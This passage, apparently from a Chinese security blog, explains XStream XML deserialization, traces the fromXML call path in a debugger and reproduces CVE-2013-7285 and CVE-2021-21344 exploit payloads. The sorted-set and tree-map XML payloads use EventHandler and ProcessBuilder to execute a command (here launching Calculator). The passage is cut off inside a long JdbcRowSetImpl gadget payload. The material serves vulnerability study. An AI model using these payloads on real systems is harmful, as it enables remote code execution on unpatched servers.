 <span class="keyword">private</span> String companyLocation;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Company</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Company</span><span class="params">(String companyName, String companyLocation)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.companyName = companyName;</span><br><span class="line">        <span class="built_in">this</span>.companyLocation = companyLocation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCompanyName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> companyName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCompanyName</span><span class="params">(String companyName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.companyName = companyName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCompanyLocation</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> companyLocation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCompanyLocation</span><span class="params">(String companyLocation)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.companyLocation = companyLocation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;Company&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Xstream_stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;ocean&quot;</span>, <span class="number">19</span>, <span class="keyword">new</span> <span class="title class_">Company</span>(<span class="string">&quot;zzzz&quot;</span>, <span class="string">&quot;shandong&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(person);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.ocean.Person</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>ocean<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>19<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">companyName</span>&gt;</span>zzzz<span class="tag">&lt;/<span class="name">companyName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">companyLocation</span>&gt;</span>shandong<span class="tag">&lt;/<span class="name">companyLocation</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">com.ocean.Person</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的输出是将java对象转换为xml格式，并且类是没有实现序列化接口的，下面看一下实现了序列化接口的类输出格式是什么样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ocean.Person serialization=<span class="string">&quot;custom&quot;</span>&gt;</span><br><span class="line">  &lt;com.ocean.Person&gt;</span><br><span class="line">    &lt;<span class="keyword">default</span>&gt;</span><br><span class="line">      &lt;age&gt;<span class="number">19</span>&lt;/age&gt;</span><br><span class="line">      &lt;company serialization=<span class="string">&quot;custom&quot;</span>&gt;</span><br><span class="line">        &lt;com.ocean.Company&gt;</span><br><span class="line">          &lt;<span class="keyword">default</span>&gt;</span><br><span class="line">            &lt;companyLocation&gt;shandong&lt;/companyLocation&gt;</span><br><span class="line">            &lt;companyName&gt;zzzz&lt;/companyName&gt;</span><br><span class="line">          &lt;/<span class="keyword">default</span>&gt;</span><br><span class="line">        &lt;/com.ocean.Company&gt;</span><br><span class="line">      &lt;/company&gt;</span><br><span class="line">      &lt;name&gt;ocean&lt;/name&gt;</span><br><span class="line">    &lt;/<span class="keyword">default</span>&gt;</span><br><span class="line">  &lt;/com.ocean.Person&gt;</span><br><span class="line">&lt;/com.ocean.Person&gt;</span><br></pre></td></tr></table></figure><p>可以看出实现了序列化接口和不实现序列化接口在经过xstream转换之后的格式是不一样的</p><h2 id="调试流程">调试流程</h2><p>这里我们调试一下看看xstream在反序列化时的执行流程,Xstream在反序列化时调用的方法是</p><p>fromXML</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Xstream_stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;ocean&quot;</span>, <span class="number">19</span>, <span class="keyword">new</span> <span class="title class_">Company</span>(<span class="string">&quot;zzzz&quot;</span>, <span class="string">&quot;shandong&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(person);</span><br><span class="line">        <span class="comment">//System.out.println(xml);</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> xStream.fromXML(xml);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下断点开始跟一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735390997579-bb429176-92b2-4536-b3e5-c9a2a45fed45.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391021227-d52575bb-25ca-4558-b23f-6666e3abf367.png" alt=""></p><p>这里会调用unmarshal方法跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391085389-9ef088b5-dda3-4c4d-af66-8535ef15bd32.png" alt=""><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391095200-86d3a170-a1f2-48ce-893a-d586a99c2fec.png" alt=""></p><p>这里发现他会调用ReferenceByXPathMarshallingStrategy父类AbstractTreeMarshallingStrategy的unmarshal方法跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391280029-f0335716-8819-4426-b92a-50837a63fbf9.png" alt=""></p><p>往下走跟进TreeUnmarshaller类的start方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391343335-84748bd5-c7eb-4ee8-9954-a656afc321d6.png" alt=""></p><p>先看看readClassType做了什么</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391409800-0497b88e-579f-46bb-a646-023918e16f24.png" alt=""></p><p>通过节点名获取Mapper中对应的Class对象返回值type就是obj对应的Class对象。接着在来看看convertAnother方法干啥了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391515365-17ddf802-6dc2-4232-9550-c2079e4bcbcd.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391553939-37bad94d-198a-4fa9-aa22-028427a6216b.png" alt="">根据mapper获取type类对象的正确类型根据type找到对应的converter ，如何查找对应的converter？可以看到上面存在一个lookupConverterForType看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735391697233-4408349a-c8a1-40be-a71f-6f92a0f856d9.png" alt=""></p><p>先从缓存集合中查找Converter，如果缓存中没有，那么就在converter中寻找，然后遍历converters找到符合的Converter并把找到的放在缓存集合中。</p><p>继续走会走到convert方法中<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392551241-c9cc4a24-7095-4d45-9fd6-47885590f9fa.png" alt="">会继续调用父类的covert方法跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392571674-51120d17-24bc-4de7-b6ab-c8ca4ca51c40.png" alt=""></p><p>会调用unmarshal方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392594331-39da6eb1-6f31-435f-9981-ef56b8f3bea3.png" alt=""></p><p>这里构造Class类对象的instance实例，field没有赋值，都是默认值，然后对result的field赋值。</p><h3 id="重点">重点</h3><p>这里会有一点不一样的是对于实现序列化接口的类和没有实现的用到的convert是不一样的这里可以看到没实现的convert是ReflectionConverter<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392150239-746a70d9-26e6-4ad6-a051-a1232b781b8b.png" alt=""></p><p>再来看看实现了的是什么</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392198406-c6893ad4-99b9-4fa9-8a69-5198a3c84889.png" alt=""></p><p>可以看到用到的是SerializableConverter该Converter的原理是通过反射获取类对象并通过反射为其每个属性进行赋值，那如过是处理实现了Serializable接口并且重写了readObject方法的People类时会有什么不一样呢？</p><p>这里我们在Person类的readObject方法中打上断点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735392319791-ba89493b-32f3-4d48-b422-2106461052c0.png" alt=""></p><p>可以看到在反序列化的时候是会调用到Person类的反序列化方法的调用栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">readObject:<span class="number">45</span>, Person (com.ocean)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">callReadObject:<span class="number">113</span>, SerializationMethodInvoker (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:<span class="number">412</span>, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:<span class="number">230</span>, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">65</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1035</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1019</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">895</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">886</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">11</span>, Xstream_stu (com.ocean)</span><br></pre></td></tr></table></figure><p>所以此时就是要去找链子了。</p><h2 id="CVE-2013-7285">CVE-2013-7285</h2><h3 id="sorted-set">sorted-set</h3><h4 id="测试环境">测试环境</h4><p>jdk8u65</p><p>xstream 1.4.x-1.4.6及1.4.10</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>-a<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="tree-map">tree-map</h3><h4 id="测试环境-2">测试环境</h4><p>jdk8u65</p><p>版本&lt;=1.4.6或=1.4.10</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>-na<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>详细流程分析参考自：<a href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%88%86%E6%9E%90">https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%88%86%E6%9E%90</a></p><h2 id="CVE-2021-21344">CVE-2021-21344</h2><h3 id="测试环境-3">测试环境</h3><p>jdk8u65</p><p>xstream 1.4.15</p><p>先来看一下Payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span 